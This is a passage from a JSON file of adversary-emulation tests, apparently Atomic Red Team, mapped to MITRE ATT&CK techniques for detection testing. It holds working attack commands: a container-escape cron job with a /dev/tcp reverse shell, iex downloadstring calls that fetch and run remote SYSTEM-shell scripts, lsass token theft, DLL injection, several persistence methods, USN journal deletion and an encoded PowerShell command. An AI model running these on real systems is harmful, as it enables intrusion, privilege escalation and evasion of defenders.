				"get_prereq_command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n"
			},
			{
				"description": "Verify mount device (/dev/dm-0) exists.",
				"prereq_command": "ls #{mount_device}\n",
				"get_prereq_command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n"
			},
			{
				"description": "Netcat is installed.",
				"prereq_command": "which netcat\n",
				"get_prereq_command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi\n"
			},
			{
				"description": "IP Address is known.",
				"prereq_command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n",
				"get_prereq_command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'\" >> #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2>&1\n",
			"cleanup_command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}\n"
		},
		"attack_technique": "T1611",
		"phases": ["privilege-escalation"]
	},
	{
		"name": "Access Token Manipulation",
		"auto_generated_guid": "dbf4f5a9-b8e0-46a3-9841-9ad71247239e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n& \"$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1134.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique",
		"auto_generated_guid": "ccf4ac39-ec93-42be-9035-90e2f26bcd92",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1134.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "System Network Configuration Discovery on Windows",
		"auto_generated_guid": "970ab6a1-0157-4f3f-9a73-ec4166754b23",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1016",
		"phases": ["discovery"]
	},
	{
		"name": "List Windows Firewall Rules",
		"auto_generated_guid": "038263cb-00f4-4b0a-98ae-0696c67e1752",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "netsh advfirewall firewall show rule name=all\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1016",
		"phases": ["discovery"]
	},
	{
		"name": "System Network Configuration Discovery",
		"auto_generated_guid": "c141bbdb-7fca-4254-9fd6-f47e79447e17",
		"supported_platforms": ["macos", "linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if arp command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "(which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)\n"
			}
		],
		"executor": {
			"command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"netstat -Sp tcp\"; else cmd=\"netstat -ant\"; fi;\nif [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1016",
		"phases": ["discovery"]
	},
	{
		"name": "System Network Configuration Discovery (TrickBot Style)",
		"auto_generated_guid": "dafaf052-5508-402d-bf77-51e0700c02e2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1016",
		"phases": ["discovery"]
	},
	{
		"name": "List Open Egress Ports",
		"auto_generated_guid": "4b467538-f102-491d-ace7-ed487b853bf5",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Path of file to write port scan results",
				"type": "path",
				"default": "$env:USERPROFILE\\Desktop\\open-ports.txt"
			},
			"portfile_url": {
				"description": "URL to top-128.txt",
				"type": "url",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt"
			},
			"port_file": {
				"description": "The path to a text file containing ports to be scanned, one port per line. The default list uses the top 128 ports as defined by Nmap.",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1016\\src\\top-128.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Test requires #{port_file} to exist\n",
				"prereq_command": "if (Test-Path \"#{port_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{port_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"#{portfile_url}\" -OutFile \"#{port_file}\"\n"
			}
		],
		"executor": {
			"command": "$ports = Get-content \"#{port_file}\"\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n",
			"cleanup_command": "Remove-Item -ErrorAction ignore \"#{output_file}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1016",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind - Enumerate Active Directory Subnet Objects",
		"auto_generated_guid": "9bb45dd7-c466-4f93-83a1-be30e56033ee",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet) #{optional_args}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1016",
		"phases": ["discovery"]
	},
	{
		"name": "Qakbot Recon",
		"auto_generated_guid": "121de5c6-5818-4868-b8a7-8fd07c455c1b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"recon_commands": {
				"description": "File that houses list of commands to be executed",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1016\\src\\qakbot.bat"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "File to copy must exist on disk at specified location (#{recon_commands})\n",
				"prereq_command": "if (Test-Path \"#{recon_commands}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{recon_commands}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat\" -OutFile \"#{recon_commands}\"\n"
			}
		],
		"executor": {
			"command": "\"#{recon_commands}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1016",
		"phases": ["discovery"]
	},
	{
		"name": "List macOS Firewall Rules",
		"auto_generated_guid": "ff1d8c25-2aa4-4f18-a425-fede4a41ee88",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo defaults read /Library/Preferences/com.apple.alf\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1016",
		"phases": ["discovery"]
	},
	{
		"name": "DNS Server Discovery Using nslookup",
		"auto_generated_guid": "34557863-344a-468f-808b-a1bfb89b4fa9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1016",
		"phases": ["discovery"]
	},
	{
		"name": "Mount ISO image",
		"auto_generated_guid": "002cca30-4778-4891-878a-aaffcfa502fa",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"path_of_iso": {
				"description": "Path to ISO file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1553.005\\bin\\T1553.005.iso"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1553.005.iso must exist on disk at specified location (#{path_of_iso})\n",
				"prereq_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/T1553.005.iso -OutFile \"#{path_of_iso}\"\n"
			}
		],
		"executor": {
			"command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\"\n",
			"cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1553.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Mount an ISO image and run executable from the ISO",
		"auto_generated_guid": "42f22b00-0242-4afc-a61b-0da05041f9cc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"path_of_iso": {
				"description": "Path to ISO file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})\n",
				"prereq_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile \"#{path_of_iso}\"\n"
			}
		],
		"executor": {
			"command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"TestIso\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\ninvoke-item \"$($driveLetter):\\hello.exe\"\n",
			"cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\nStop-process -name \"hello\" -Force -ErrorAction ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1553.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Remove the Zone.Identifier alternate data stream",
		"auto_generated_guid": "64b12afc-18b8-4d3f-9eab-7f6cae7c73f9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_to_download": {
				"description": "File that will be downloaded to test against.",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md"
			},
			"file_path": {
				"description": "File to have the Zone.Identifier removed.",
				"type": "string",
				"default": "$env:tmp\\ReadMe.md"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "A test file with the Zone.Identifier attribute must be present.",
				"prereq_command": "if (Test-Path #{file_path}) { EXIT 0 } else { EXIT 1 }\n",
				"get_prereq_command": "Invoke-WebRequest #{file_to_download} -OutFile #{file_path}\nSet-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'\n"
			}
		],
		"executor": {
			"command": "Unblock-File -Path #{file_path}\n",
			"cleanup_command": "Set-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1553.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Execute LNK file from ISO",
		"auto_generated_guid": "c2587b8d-743d-4985-aa50-c83394eaeb68",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"path_of_iso": {
				"description": "Path to ISO file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AllTheThings.iso must exist on disk at specified location (#{path_of_iso})\n",
				"prereq_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso -OutFile \"#{path_of_iso}\"\n"
			}
		],
		"executor": {
			"command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"AllTheThings\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"))\n$instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)\n",
			"cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1553.005",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Process Injection via mavinject.exe",
		"auto_generated_guid": "74496461-11a1-4982-b439-4d87a550d254",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process_id": {
				"description": "PID of input_arguments",
				"type": "string",
				"default": "(Start-Process notepad -PassThru).id"
			},
			"dll_payload": {
				"description": "DLL to Inject",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1055.001\\src\\x64\\T1055.001.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n",
				"prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll\" -OutFile \"#{dll_payload}\"\n"
			}
		],
		"executor": {
			"command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\nStop-Process -processname notepad\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1055.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique",
		"auto_generated_guid": "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1055.001",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Append malicious start-process cmdlet",
		"auto_generated_guid": "090e5aa5-32b6-473b-a49b-21e843a56896",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_path": {
				"description": "Path the malicious executable",
				"type": "path",
				"default": "calc.exe"
			},
			"ps_profile": {
				"description": "Powershell profile to use",
				"type": "string",
				"default": "$profile"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Ensure a powershell profile exists for the current user\n",
				"prereq_command": "if (Test-Path #{ps_profile}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Path #{ps_profile} -Type File -Force\n"
			}
		],
		"executor": {
			"command": "Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n",
			"cleanup_command": "$oldprofile = cat $profile | Select-Object -skiplast 1\nSet-Content $profile -Value $oldprofile\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1546.013",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Install MS Exchange Transport Agent Persistence",
		"auto_generated_guid": "43e92449-ff60-46e9-83a3-1a38089df94d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"class_factory": {
				"description": "Class factory of transport agent.",
				"type": "string",
				"default": "Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory"
			},
			"dll_path": {
				"description": "Path of DLL to use as transport agent.",
				"type": "path",
				"default": "c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll"
			},
			"transport_agent_identity": {
				"description": "Friendly name of transport agent once installed.",
				"type": "string",
				"default": "Security Interop Agent"
			}
		},
		"dependencies": [
			{
				"description": "Microsoft Exchange SnapIn must be installed\n",
				"prereq_command": "Get-TransportAgent -TransportService FrontEnd\n",
				"get_prereq_command": "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn\n"
			}
		],
		"executor": {
			"command": "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n",
			"cleanup_command": "if(Get-Command \"Get-TransportAgent\" -ErrorAction Ignore){\n  Disable-TransportAgent #{transport_agent_identity}\n  Uninstall-TransportAgent #{transport_agent_identity}\n  Get-TransportAgent\n}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1505.002",
		"phases": ["persistence"]
	},
	{
		"name": "Office Application Startup Test Persistence (HKCU)",
		"auto_generated_guid": "c3e35b58-fe1c-480b-b540-7600fb612563",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Microsoft Word must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
			},
			{
				"description": "DLL files must exist on disk at specified location",
				"prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.002\\bin\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x64.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\"\nInvoke-Webrequest -Uri \"htps://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x86.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\""
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n",
			"cleanup_command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office test\\Special\\Perf\" -ErrorAction Ignore",
			"elevation_required": false
		},
		"attack_technique": "T1137.002",
		"phases": ["persistence"]
	},
	{
		"name": "AutoIt Script Execution",
		"auto_generated_guid": "a9b93f17-31cb-435d-a462-5e838a2a6026",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AutoIt executable file must exist on disk at the specified location (#{autoit_path})\n",
				"prereq_command": "if(Test-Path \"#{autoit_path}\") {\n    exit 0\n} else {\n    exit 1\n}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$AutoItURL = \"https://www.autoitscript.com/cgi-bin/getfile.pl?autoit3/autoit-v3-setup.exe\"\n$InstallerPath = \"$PathToAtomicsFolder\\..\\ExternalPayloads\\autoit-v3-setup.exe\"\nInvoke-WebRequest -Uri $AutoItURL -OutFile $InstallerPath\nStart-Process -FilePath $InstallerPath -ArgumentList \"/S\" -Wait\n"
			}
		],
		"input_arguments": {
			"script_path": {
				"description": "AutoIt Script Path",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1059\\src\\calc.au3"
			},
			"autoit_path": {
				"description": "AutoIt Executable File Path",
				"type": "path",
				"default": "C:\\Program Files (x86)\\AutoIt3\\AutoIt3.exe"
			}
		},
		"executor": {
			"command": "Start-Process -FilePath \"#{autoit_path}\" -ArgumentList \"#{script_path}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059",
		"phases": ["execution"]
	},
	{
		"name": "Indicator Removal using FSUtil",
		"auto_generated_guid": "b4115c7a-0e92-47f0-a61e-17e7218b2435",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "fsutil usn deletejournal /D C:\n",
			"cleanup_command": "fsutil usn createjournal m=1000 a=100 c:\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1070",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Indicator Manipulation using FSUtil",
		"auto_generated_guid": "96e86706-6afd-45b6-95d6-108d23eaf2e9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_to_manipulate": {
				"description": "Path of file to manipulate",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt"
			},
			"file_data_length": {
				"description": "Data length to setzero",
				"type": "integer",
				"default": 10
			}
		},
		"executor": {
			"command": "if (-not (Test-Path \"#{file_to_manipulate}\")) { New-Item \"#{file_to_manipulate}\" -Force } \necho \"1234567890\" > \"#{file_to_manipulate}\"\nfsutil  file setZeroData offset=0 length=#{file_data_length} \"#{file_to_manipulate}\"\n",
			"cleanup_command": "rm \"#{file_to_manipulate}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WMI Reconnaissance Users",
		"auto_generated_guid": "c107778c-dcf5-47c5-af2e-1d058a3df3ea",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wmic useraccount get /ALL /format:csv\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "WMI Reconnaissance Processes",
		"auto_generated_guid": "5750aa16-0e59-4410-8b9a-8a47ca2788e2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wmic process get caption,executablepath,commandline /format:csv\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "WMI Reconnaissance Software",
		"auto_generated_guid": "718aebaa-d0e0-471a-8241-c5afa69c7414",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wmic qfe get description,installedOn /format:csv\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "WMI Reconnaissance List Remote Services",
		"auto_generated_guid": "0fd48ef7-d890-4e93-a533-f7dedd5191d3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"node": {
				"description": "Ip Address",
				"type": "string",
				"default": "127.0.0.1"
			},
			"service_search_string": {
				"description": "Name Of Service",
				"type": "string",
				"default": "Spooler"
			}
		},
		"executor": {
			"command": "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\")\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "WMI Execute Local Process",
		"auto_generated_guid": "b3bdfc91-b33e-4c6d-a5c8-d64bee0276b3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process_to_execute": {
				"description": "Name or path of process to execute.",
				"type": "string",
				"default": "notepad.exe"
			}
		},
		"executor": {
			"command": "wmic process call create #{process_to_execute}\n",
			"cleanup_command": "wmic process where name='#{process_to_execute}' delete >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "WMI Execute Remote Process",
		"auto_generated_guid": "9c8ef159-c666-472f-9874-90c8d60d136b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"node": {
				"description": "Ip Address",
				"type": "string",
				"default": "127.0.0.1"
			},
			"user_name": {
				"description": "Username",
				"type": "string",
				"default": "DOMAIN\\Administrator"
			},
			"password": {
				"description": "Password",
				"type": "string",
				"default": "P@ssw0rd1"
			},
			"process_to_execute": {
				"description": "Name or path of process to execute.",
				"type": "string",
				"default": "notepad.exe"
			}
		},
		"executor": {
			"command": "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process call create #{process_to_execute}\n",
			"cleanup_command": "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process where name='#{process_to_execute}' delete >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "Create a Process using WMI Query and an Encoded Command",
		"auto_generated_guid": "7db7a7f9-9531-4840-9b30-46220135441c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1047",
		"phases": ["execution"]
	},
	{
		"name": "Create a Process using obfuscated Win32_Process",
		"auto_generated_guid": "10447c83-fc38-462a-a936-5102363b1c43",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_class": {
				"description": "Derived class name",
				"type": "string",
				"default": "Win32_Atomic"
			},
			"process_to_execute": {
				"description": "Name or path of process to execute.",
				"type": "string",
				"default": "notepad.exe"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": true,
